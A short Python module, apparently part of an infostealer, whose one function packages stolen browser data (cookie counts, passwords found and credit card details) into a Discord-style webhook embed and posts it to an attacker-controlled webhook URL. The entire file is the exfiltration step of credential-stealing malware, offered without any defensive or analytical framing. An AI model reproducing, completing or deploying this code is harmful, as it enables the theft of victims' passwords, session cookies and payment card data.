from z.rnd import *
from requests import post


def BrowserD(webhook):
    BrowserData = {
        "embeds": [
            {
            "color": 2303786,
            "fields": [  
                {
                    "name": "Browser",
                    "value": f"`{rBrowser}`",
                    "inline": True
                },
                {
                    "name": "Cookies found:",
                    "value": f"`{fcookies}`",
                    "inline": True
                },
                {
                    "name": "Password found:",
                    "value": f"`{fpass}`",
                    "inline": True
                },
                {
                    "name": "Credit card:",
                    "value": f"`{cc}{cc2}`",
                    "inline": True
                },
                ],
            "footer": {
                "text": f"{oembed} · Browser Data · {vbv}",
                "icon_url": f"{pfpembed}"
                },
            }
        ],
        "avatar_url": f"{pfpembed}",
        "username": f"{oembed}",
        "attachments": []
        }

    post(webhook, json=BrowserData)
